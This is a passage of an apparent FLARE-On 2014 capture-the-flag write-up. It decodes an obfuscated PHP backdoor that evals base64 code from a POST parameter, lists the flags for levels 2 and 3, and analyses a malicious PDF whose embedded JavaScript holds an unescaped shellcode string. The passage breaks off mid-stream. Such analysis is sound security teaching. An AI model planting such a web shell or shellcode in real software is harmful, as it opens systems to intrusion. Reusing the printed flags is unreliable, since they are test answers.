#93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">51</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">21</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">47</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">10</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">82</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">82</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">29</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">29</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">47</span><span style="color: #93A1A1">]</span>

<span style="color: #93A1A1">do_me</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;&quot;</span>
<span style="color: #719e07">for</span> <span style="color: #93A1A1">i</span> <span style="color: #719e07">in</span> <span style="color: #B58900">range</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span><span style="color: #B58900">len</span><span style="color: #93A1A1">(order)):</span>
    <span style="color: #93A1A1">do_me</span> <span style="color: #719e07">+=</span> <span style="color: #93A1A1">terms[order[i]]</span>

<span style="color: #719e07">print</span> <span style="color: #93A1A1">do_me</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Produces the following PHP code:



    

<figure class="code">
  <figcaption>
  	<span>PHP code</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #CB4B16">$_= &#39;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&#39;;</span>
<span style="color: #CB4B16">$__=&#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#39;;</span>
<span style="color: #CB4B16">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;; // base64_decode</span>
<span style="color: #CB4B16">eval($___($__));</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Contents of <code>$_</code> and <code>$__</code> are clearly encoded in <code>base64</code> and  <code>$___</code> is <code>base64_decode</code>. Base64 can be decoded in Python by calling <code>base64.b64decode</code>.
Line #4 can be re-written as</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Line 4</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #CB4B16">eval(base64_decode(&#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#39;));</span>

<span style="color: #CB4B16">// result</span>

<span style="color: #CB4B16">$code=base64_decode($_);    eval($code);</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>So it must decode the first base64 blob and eval it. Let&rsquo;s decode it:</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Decoded line 4</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #CB4B16">if(isset($_POST[&quot;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&quot;])) </span>
<span style="color: #CB4B16">{ </span>
<span style="color: #CB4B16">eval(base64_decode($_POST[&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;])); </span>
<span style="color: #CB4B16">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>This looks like a POST request. The characters look like a mix of ASCII and Hex values. Let&rsquo;s print them using Python and hope this is the last encoding:</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Decoder code in Python</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">mylist</span><span style="color: #719e07">=</span> <span style="color: #93A1A1">[</span><span style="color: #2AA198">97</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x4F</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">84</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">116</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x68</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">97</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x74</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x44</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x4F</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x54</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x6A</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">97</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x76</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x61</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x35</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x63</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x72</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">97</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x70</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x41</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">84</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x66</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x6C</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">97</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x72</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x65</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x44</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">65</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x53</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">72</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">111</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">110</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">79</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">84</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">99</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x6F</span><span style="color: #93A1A1">,</span><span style="color: #2AA198">0x6D</span><span style="color: #93A1A1">]</span>

<span style="color: #719e07">print</span> <span style="color: #2AA198">&#39;&#39;</span><span style="color: #719e07">.</span><span style="color: #93A1A1">join(</span> <span style="color: #B58900">chr</span><span style="color: #93A1A1">(item)</span> <span style="color: #719e07">for</span> <span style="color: #93A1A1">item</span> <span style="color: #719e07">in</span> <span style="color: #93A1A1">mylist)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Fortunately, we are done.</p>

<h4 id="level-2-flag-a11dotthatdotjava5crapatflaredashondotcom-or-a11-that-java5crap-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7">Level 2 flag: a11DOTthatDOTjava5crapATflareDASHonDOTcom or a11.that.java5crap@flare-on.com</h4>

<hr />

<h2 id="a-name-ch3-a-challenge-3-cheating-my-way-to-the-top:94bf06dd1bee42f6b34a1ff79274f7e7"><a name="ch3"></a> Challenge 3 - Cheating My Way to the Top</h2>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">Nice job, you&#39;re really knocking these out! Here&#39;s the next binary. The password to the zip archive is &quot;malware&quot; again.
Keep up the good work, and good luck!
-FLARE
</pre></div>

<p>Challenge 3 is a Win32 binary called <code>such_evil</code>. <code>PE-Studio</code> does not tell us much.</p>

<p>Running it will result in this message:</p>

<p><img src="/images/2014/flare/3-1.jpg" alt="BrokenByte" title="BrokenByte" /></p>

<p>I cheated in this challenge. I just dropped the executable in <code>Immunity Debugger</code>, ran it and looked in memory when the message box popped up and the email was there:</p>

<p><img src="/images/2014/flare/3-2.jpg" alt="Flag in memory" title="Flag in memory" /></p>

<h4 id="level-3-flag-such-5h311010101-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7">Level 3 flag: such.5h311010101@flare-on.com</h4>

<hr />

<h2 id="a-name-ch4-a-challenge-4-things-are-getting-cereal:94bf06dd1bee42f6b34a1ff79274f7e7"><a name="ch4"></a> Challenge 4 - Things are Getting Cereal</h2>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">Well done! Such dedication, much work, wow.
Here&#39;s the next challenge, password is the same as last time. We&#39;ll talk more when you figure it out.
-FLARE
</pre></div>

<p>It&rsquo;s a two page PDF named <code>APT9001.pdf</code>. First page is a picture of APT1 report and second page is empty.
We can just open the PDF in a <code>HxD</code> but it won&rsquo;t tell us much.
There are tools that will help us parse the PDF. I used <code>pyew</code>. You can find a good tutorial for PDF analysis <a href="https://code.google.com/p/pyew/wiki/PDFAnalysis" target="_blank">here</a>.<br />
Let&rsquo;s follow the tutorial:</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>pyew output for the PDF</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">$</span> <span style="color: #93A1A1">python</span> <span style="color: #93A1A1">pyew</span><span style="color: #719e07">.</span><span style="color: #93A1A1">py</span> <span style="color: #93A1A1">APT9001</span><span style="color: #719e07">.</span><span style="color: #93A1A1">pdf</span>
<span style="color: #93A1A1">PDF</span> <span style="color: #93A1A1">File</span>

<span style="color: #93A1A1">PDFiD</span> <span style="color: #2AA198">0.0</span><span style="color: #719e07">.</span><span style="color: #2AA198">11</span> <span style="color: #93A1A1">APT9001</span><span style="color: #719e07">.</span><span style="color: #93A1A1">pdf</span>
 <span style="color: #93A1A1">PDF</span> <span style="color: #93A1A1">Header:</span> <span style="color: #719e07">%</span><span style="color: #93A1A1">PDF</span><span style="color: #719e07">-</span><span style="color: #2AA198">1.5</span>
 <span style="color: #93A1A1">obj</span>                   <span style="color: #2AA198">10</span>
 <span style="color: #93A1A1">endobj</span>                 <span style="color: #2AA198">9</span>
 <span style="color: #93A1A1">stream</span>                 <span style="color: #2AA198">3</span>
 <span style="color: #93A1A1">endstream</span>              <span style="color: #2AA198">3</span>
 <span style="color: #93A1A1">xref</span>                   <span style="color: #2AA198">2</span>
 <span style="color: #93A1A1">trailer</span>                <span style="color: #2AA198">2</span>
 <span style="color: #93A1A1">startxref</span>              <span style="color: #2AA198">2</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">Page</span>                  <span style="color: #2AA198">3</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">)</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">Encrypt</span>               <span style="color: #2AA198">0</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">ObjStm</span>                <span style="color: #2AA198">0</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">JS</span>                    <span style="color: #2AA198">1</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">)</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">JavaScript</span>            <span style="color: #2AA198">1</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">)</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">AA</span>                    <span style="color: #2AA198">0</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">OpenAction</span>            <span style="color: #2AA198">1</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">)</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">AcroForm</span>              <span style="color: #2AA198">0</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">JBIG2Decode</span>           <span style="color: #2AA198">1</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">)</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">RichMedia</span>             <span style="color: #2AA198">0</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">Launch</span>                <span style="color: #2AA198">0</span>
 <span style="color: #719e07">/</span><span style="color: #93A1A1">Colors</span> <span style="color: #719e07">&gt;</span> <span style="color: #2AA198">2</span><span style="color: #719e07">^</span><span style="color: #2AA198">24</span>         <span style="color: #2AA198">0</span>
 <span style="color: #719e07">%%</span><span style="color: #93A1A1">EOF</span>                  <span style="color: #2AA198">1</span>
 <span style="color: #93A1A1">After</span> <span style="color: #93A1A1">last</span> <span style="color: #719e07">%%</span><span style="color: #93A1A1">EOF</span>       <span style="color: #2AA198">0</span>
 <span style="color: #93A1A1">Total</span> <span style="color: #93A1A1">entropy:</span>           <span style="color: #2AA198">7.862012</span> <span style="color: #93A1A1">(</span>     <span style="color: #2AA198">21284</span> <span style="color: #B58900">bytes</span><span style="color: #93A1A1">)</span>
 <span style="color: #93A1A1">Entropy</span> <span style="color: #93A1A1">inside</span> <span style="color: #93A1A1">streams:</span>  <span style="color: #2AA198">7.890539</span> <span style="color: #93A1A1">(</span>     <span style="color: #2AA198">19723</span> <span style="color: #B58900">bytes</span><span style="color: #93A1A1">)</span>
 <span style="color: #93A1A1">Entropy</span> <span style="color: #93A1A1">outside</span> <span style="color: #93A1A1">streams:</span> <span style="color: #2AA198">4.745484</span> <span style="color: #93A1A1">(</span>      <span style="color: #2AA198">1561</span> <span style="color: #B58900">bytes</span><span style="color: #93A1A1">)</span>

<span style="color: #586E75"># first 512 bytes of the PDF removed</span>

<span style="color: #586E75"># To list the streams that are encoded and see what filters the stream is using type &quot;pdfilter&quot;: </span>
<span style="color: #93A1A1">[</span><span style="color: #2AA198">0x00000000</span><span style="color: #93A1A1">]</span><span style="color: #719e07">&gt;</span> <span style="color: #93A1A1">pdfilter</span>
<span style="color: #93A1A1">Stream</span> <span style="color: #2AA198">1</span> <span style="color: #93A1A1">uses</span> <span style="color: #93A1A1">FlateDecode</span>
<span style="color: #93A1A1">Stream</span> <span style="color: #2AA198">1</span> <span style="color: #93A1A1">uses</span> <span style="color: #93A1A1">ASCIIHexDecode</span>
<span style="color: #93A1A1">Stream</span> <span style="color: #2AA198">2</span> <span style="color: #93A1A1">uses</span> <span style="color: #93A1A1">FlateDecode</span>
<span style="color: #93A1A1">Stream</span> <span style="color: #2AA198">2</span> <span style="color: #93A1A1">uses</span> <span style="color: #93A1A1">ASCIIHexDecode</span>
<span style="color: #93A1A1">Stream</span> <span style="color: #2AA198">2</span> <span style="color: #93A1A1">uses</span> <span style="color: #93A1A1">JBIG2Decode</span>
<span style="color: #93A1A1">Stream</span> <span style="color: #2AA198">3</span> <span style="color: #93A1A1">uses</span> <span style="color: #93A1A1">FlateDecode</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Seems like streams 1,2 and 3 are interesting. According to the tutorial <code>pdfvi</code> displays them.</p>

<ul>
<li>FlateDecode: Decompress. In Python do <code>zlib.decompress</code></li>
<li>ASCIIHexDecode: Decode from ASCII Hex</li>
<li>JBIG2Decode: Decode as a black and white image</li>
</ul>

<p>What really threw me off was the <code>JBIG2Decode</code> decoder for stream 2. There was a <a href="http://vrt-blog.snort.org/2009/02/have-nice-weekend-pdf-love.html" target="_blank">vulnerability</a> associated with it. It is too short to be the email (14 bytes). It is not compressed (lacks the magic headers). <code>Pyew</code> also displays the disassembly but it is not shellcode either (if it is, then I didn&rsquo;t recognize it). It is also not an image (hence the <code>JBIG2Decode</code> filter).</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Stream 2</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #268BD2">Applying</span> <span style="color: #268BD2">Filter</span> <span style="color: #268BD2">FlateDecode</span> <span style="color: #268BD2">...</span>
<span style="color: #268BD2">Applying</span> <span style="color: #268BD2">Filter</span> <span style="color: #268BD2">ASCIIHexDecode</span> <span style="color: #268BD2">...</span>
<span style="color: #268BD2">Applying</span> <span style="color: #268BD2">Filter</span> <span style="color: #268BD2">JBIG2Decode</span> <span style="color: #268BD2">...</span>
<span style="color: #268BD2">Encoded</span> <span style="color: #268BD2">Stream</span> <span style="color: #2AA198">2</span>
<span style="color: #93A1A1">--------------------------------------------------------------------------------</span>
<span style="color: #93A1A1">0000</span>   <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">20</span> <span style="color: #93A1A1">50</span> <span style="color: #268BD2">FF</span> <span style="color: #2AA198">40</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">69</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">05</span> <span style="color: #2AA198">69</span> <span style="color: #2AA198">50</span> <span style="color: #2AA198">50</span>          <span style="color: #268BD2">.</span> <span style="color: #268BD2">P.@..i...iPP</span>
<span style="color: #93A1A1">--------------------------------------------------------------------------------</span>

<span style="color: #268BD2">Show</span> <span style="color: #B58900">di</span><span style="color: #268BD2">sassembly</span> <span style="color: #93A1A1">(</span><span style="color: #268BD2">y</span><span style="color: #719e07">/</span><span style="color: #268BD2">n</span><span style="color: #93A1A1">)</span><span style="color: #268BD2">?</span> <span style="color: #93A1A1">[</span><span style="color: #268BD2">n</span><span style="color: #93A1A1">]:</span> <span style="color: #268BD2">y</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x00000000</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">02</span><span style="color: #93A1A1">)</span> <span style="color: #2AA198">0020</span>                 <span style="color: #268BD2">ADD</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">EAX</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">AH</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x00000002</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">01</span><span style="color: #93A1A1">)</span> <span style="color: #2AA198">50</span>                   <span style="color: #268BD2">PUSH</span> <span style="color: #B58900">EAX</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x00000003</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">03</span><span style="color: #93A1A1">)</span> <span style="color: #268BD2">ff40</span> <span style="color: #2AA198">00</span>              <span style="color: #268BD2">INC</span> <span style="color: #DC322F">DWORD</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">EAX</span><span style="color: #719e07">+</span><span style="color: #2AA198">0x0</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x00000006</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">03</span><span style="color: #93A1A1">)</span> <span style="color: #2AA198">0069</span> <span style="color: #2AA198">00</span>              <span style="color: #268BD2">ADD</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ECX</span><span style="color: #719e07">+</span><span style="color: #2AA198">0x0</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">CH</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x00000009</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">01</span><span style="color: #93A1A1">)</span> <span style="color: #2AA198">00</span>                   <span style="color: #268BD2">DB</span> <span style="color: #2AA198">0x0</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x0000000a</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">01</span><span style="color: #93A1A1">)</span> <span style="color: #2AA198">05</span>                   <span style="color: #268BD2">DB</span> <span style="color: #2AA198">0x5</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x0000000b</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">01</span><span style="color: #93A1A1">)</span> <span style="color: #2AA198">69</span>                   <span style="color: #268BD2">DB</span> <span style="color: #2AA198">0x69</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x0000000c</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">01</span><span style="color: #93A1A1">)</span> <span style="color: #2AA198">50</span>                   <span style="color: #268BD2">PUSH</span> <span style="color: #B58900">EAX</span>
<span style="color: #93A1A1">0</span><span style="color: #268BD2">x0000000d</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">01</span><span style="color: #93A1A1">)</span> <span style="color: #2AA198">50</span>                   <span style="color: #268BD2">PUSH</span> <span style="color: #B58900">EAX</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Let&rsquo;s take a look at stream 1 using <code>pdfvi</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Stream 1</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">[</span><span style="color: #2AA198">0x00000000</span><span style="color: #93A1A1">]</span><span style="color: #719e07">&gt;</span> <span style="color: #93A1A1">pdfvi</span>
<span style="color: #93A1A1">Applying</span> <span style="color: #93A1A1">Filter</span> <span style="color: #93A1A1">FlateDecode</span> <span style="color: #93A1A1">...</span>
<span style="color: #93A1A1">Applying</span> <span style="color: #93A1A1">Filter</span> <span style="color: #93A1A1">ASCIIHexDecode</span> <span style="color: #93A1A1">...</span>
<span style="color: #93A1A1">Encoded</span> <span style="color: #93A1A1">Stream</span> <span style="color: #2AA198">1</span>
<span style="color: #719e07">--------------------------------------------------------------------------------</span>
    <span style="color: #268BD2">var</span> <span style="color: #93A1A1">HdPN</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>
    <span style="color: #268BD2">var</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>
    
    <span style="color: #586E75">// important</span>
    <span style="color: #268BD2">var</span> <span style="color: #93A1A1">IxTUQnOvHg</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">unescape(</span><span style="color: #2AA198">&quot;%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%</span>
<span style="color: #2AA198">ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9</span>
<span style="color: #2AA198">ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412</span>
<span style="color: #2AA198">d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%</span>
<span style="color: #2AA198">u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub</span>
<span style="color: #2AA198">7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7</span>
<span style="color: #2AA198">e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%</span>
<span style="color: #2AA198">u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4</span>
<span style="color: #2AA198">190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21b</span>
<span style="color: #2AA198">f%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%</span>
<span style="color: #2AA198">uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u7</span>
<span style="color: #2AA198">69b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb</span>
<span style="color: #2AA198">0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%</span>
<span style="color: #2AA198">u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4</span>
<span style="color: #2AA198">879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u881</span>
<span style="color: #2AA198">4%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%</span>
<span style="color: #2AA198">ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7</span>
<span style="color: #2AA198">b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u257</span>
<span style="color: #2AA198">7%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%</span>
<span style="color: #2AA198">u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u4</span>
<span style="color: #2AA198">1b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u317</span>
<span style="color: #2AA198">4%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%</span>
<span style="color: #2AA198">ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue</span>
<span style="color: #2AA198">3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b</span>
<span style="color: #2AA198">9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%</span>
<span style="color: #2AA198">u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u0</span>
<span style="color: #2AA198">27c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033</span>
<span style="color: #2AA198">c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%</span>
